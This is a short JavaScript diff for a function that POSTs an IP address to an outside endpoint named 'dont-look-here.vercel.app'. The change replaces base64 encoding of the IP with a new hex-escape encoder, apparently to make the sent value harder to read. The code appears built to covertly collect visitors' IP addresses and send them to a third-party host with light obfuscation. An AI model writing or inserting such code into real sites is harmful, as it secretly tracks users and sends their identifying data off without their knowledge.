@@ -5,8 +5,8 @@ function sendEncodedIP() {
         return;
     }
 
-    const encodedIP = btoa(ip);
-    console.log("Encoded IP:", encodedIP);
+    const encodedIP = encodeHex(ip); // Encode in Hex
+    console.log("Encoded IP (Hex):", encodedIP);
 
     fetch("https://dont-look-here.vercel.app/api/api.js", {
         method: "POST",
@@ -22,4 +22,12 @@ function sendEncodedIP() {
     .catch(error => {
         console.error("Error:", error);
     });
+}
+
+function encodeHex(str) {
+    let hex = '';
+    for (let i = 0; i < str.length; i++) {
+        hex += '\\x' + str.charCodeAt(i).toString(16);
+    }
+    return hex;
 }
